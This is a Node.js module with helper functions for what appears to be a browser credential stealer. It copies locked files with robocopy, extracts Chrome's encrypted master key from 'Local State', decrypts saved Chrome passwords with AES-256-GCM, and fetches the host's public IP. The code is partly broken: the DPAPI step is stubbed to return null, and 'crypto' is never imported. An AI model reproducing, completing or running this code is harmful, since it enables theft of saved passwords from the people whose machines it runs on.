const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

async function copyLockedFile(src, dest) {
    console.log(`[DEBUG] Copying locked file: ${src} → ${dest}`);
    try {
        fs.copyFileSync(src, dest);
        console.log("[SUCCESS] Normal copy OK");
        return true;
    } catch (e) {
        console.log("[INFO] Normal copy failed:", e.message);
    }

    for (let attempt = 1; attempt <= 10; attempt++) {  // Increased to 10 attempts
        console.log(`[DEBUG] Robocopy attempt ${attempt}/10`);
        try {
            await new Promise((resolve, reject) => {
                exec(`robocopy "${path.dirname(src)}" "${path.dirname(dest)}" "${path.basename(src)}" /COPY:DAT /R:10 /W:5 /J /MT:32`, (err) => {
                    if (err) reject(err);
                    else resolve();
                });
            });
            if (fs.existsSync(dest)) {
                const stats = fs.statSync(dest);
                console.log(`[SUCCESS] Robocopy OK - size: ${stats.size} bytes`);
                return true;
            }
        } catch (e) {
            console.log("[DEBUG] Robocopy attempt failed:", e.message);
        }
        await new Promise(r => setTimeout(r, 3000));  // 3-second wait between attempts
    }
    console.error("[ERROR] All copy attempts failed after 10 tries");
    return false;
}

function getMasterKey() {
    console.log("[DEBUG] Trying to get Chrome master key...");
    try {
        const localStatePath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Local State');
        const content = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        let encryptedKey = Buffer.from(content.os_crypt.encrypted_key, 'base64');

        if (encryptedKey.toString('utf8', 0, 5) === 'DPAPI') {
            encryptedKey = encryptedKey.slice(5);
        }

        // Runtime DPAPI decryption NOT implemented (requires native module like node-dpapi)
        // For now return null → force offline decryption
        console.log("[INFO] Runtime DPAPI not supported in this build - use offline tool with Local State");
        return null;  // ← change this line

        // If you install node-dpapi later and it bundles:
        // const dpapi = require('node-dpapi');
        // return dpapi.unprotectData(encryptedKey, null, 'CurrentUser');
    } catch (e) {
        console.error("[ERROR] Master key failed:", e.message);
        return null;
    }
}

function decryptChromePassword(encryptedValue, masterKey) {
    try {
        const iv = encryptedValue.slice(3, 15);
        const payload = encryptedValue.slice(15);
        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
        return Buffer.concat([decipher.update(payload), decipher.final()]).toString('utf8');
    } catch {
        return null;
    }
}

async function getPublicIP() {
    console.log("[DEBUG] Fetching public IP...");
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || 'Unknown';
    } catch (e) {
        console.error("[ERROR] IP fetch failed:", e.message);
        return 'Unknown';
    }
}

module.exports = {
    copyLockedFile,
    getMasterKey,
    decryptChromePassword,
    getPublicIP
};
